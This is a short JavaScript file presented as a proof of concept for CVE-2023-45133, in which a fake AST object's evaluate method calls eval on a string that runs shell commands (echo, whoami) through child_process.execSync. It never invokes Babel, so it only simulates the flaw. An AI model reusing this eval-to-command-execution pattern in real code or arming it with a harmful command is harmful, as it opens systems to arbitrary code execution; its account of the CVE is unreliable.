// File: poc_cve_2023_45133.js

const code = `
  require('child_process').execSync('echo "--- VULNERABILITY CONFIRMED ---"; whoami; echo "--- END OF POC ---"');
`;

function vulnerableFunction(path) {
  try {
    path.evaluate();
  } catch (e) {

  }
}

const fakeAst = {
  evaluate: () => eval(code)
};

vulnerableFunction(fakeAst);
